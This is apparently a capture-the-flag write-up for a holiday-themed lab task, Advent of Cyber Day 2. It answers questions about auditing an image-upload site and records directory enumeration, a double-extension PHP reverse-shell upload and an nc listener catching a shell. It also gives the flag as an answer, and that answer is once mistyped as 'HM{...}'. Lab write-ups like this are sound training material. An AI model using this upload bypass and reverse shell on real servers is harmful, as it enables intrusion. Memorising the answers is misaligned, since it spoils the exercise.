After your heroic deeds regaining control of the control centre yesterday, Elf McSkidy has decided to give you an important job to do.

"We know we've been hacked, so we need a way to protect ourselves! The dev team have set up a website for the elves to upload pictures of any suspicious people hanging around the factory, but we need to make sure it's secure before we add it to the public network. Please perform a security audit on the new server and make sure it's unhackable!"

You listen to the briefing and accept the task, pressing the deploy button to start the server as you do so.

McSkidy once again gives you a dossier of useful information to help you with your task, which you read as you wait for the server to boot:

----------
At the bottom of the dossier is a sticky note containing the following message:

For Elf McEager:
You have been assigned an ID number for your audit of the system: ODIzODI5MTNiYmYw . Use this to gain access to the upload section of the site.
Good luck!

You note down the ID number and navigate to the displayed IP address (10.10.190.12) in your browser.





- What string of text needs added to the URL to get access to the upload page?
```
?id=ODIzODI5MTNiYmYw
```
- What type of file is accepted by the site?
```
image
```
```
<input type=file id="chooseFile" accept=".jpeg,.jpg,.png">
```
- In which directory are the uploaded files stored?
```
/uploads/
```
```
dirb http://10.10.190.12
---- Scanning URL: http://10.10.190.12/ ----
==> DIRECTORY: http://10.10.190.12/assets/                                     
+ http://10.10.190.12/cgi-bin/ (CODE:403|SIZE:217)                             
+ http://10.10.190.12/favicon.ico (CODE:200|SIZE:1150)                         
==> DIRECTORY: http://10.10.190.12/noindex/                                    
==> DIRECTORY: http://10.10.190.12/uploads/     
```
- What is the flag in /var/www/flag.txt?
```
HM{MGU3Y2UyMGUwNjExYTY4NTAxOWJhMzhh}
```
```
cp php-reverse-shell.php php-reverse-shell.png.php

downloads@ubuntu:~$ nc -nlvp 1234                                                    
Listening on 0.0.0.0 1234                                                            
Connection received on 10.10.190.12 53206                                            
Linux security-server 4.18.0-193.28.1.el8_2.x86_64 #1 SMP Thu Oct 22 00:20:22 UTC 202
0 x86_64 x86_64 x86_64 GNU/Linux                                                     
 15:43:00 up 12 min,  0 users,  load average: 0.00, 0.11, 0.19                       
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT                  
uid=48(apache) gid=48(apache) groups=48(apache)                                      
sh: cannot set terminal process group (853): Inappropriate ioctl for device          
sh: no job control in this shell                                                     
sh-4.4$ id                                                                           
id                                                                                   
uid=48(apache) gid=48(apache) groups=48(apache)                                      
sh-4.4$ ls        

sh-4.4$ cat /var/www/flag.txt
cat /var/www/flag.txt 


==============================================================


You've reached the end of the Advent of Cyber, Day 2 -- hopefully you're enjoying you
rself so far, and are learning lots! 
This is all from me, so I'm going to take the chance to thank the awesome @Vargnaar f
or his invaluable design lessons, without which the theming of the past two websites 
simply would not be the same. 


Have a flag -- you deserve it!
THM{MGU3Y2UyMGUwNjExYTY4NTAxOWJhMzhh}


Good luck on your mission (and maybe I'll see y'all again on Christmas Eve)!
 --Muiri (@MuirlandOracle)


==============================================================

```
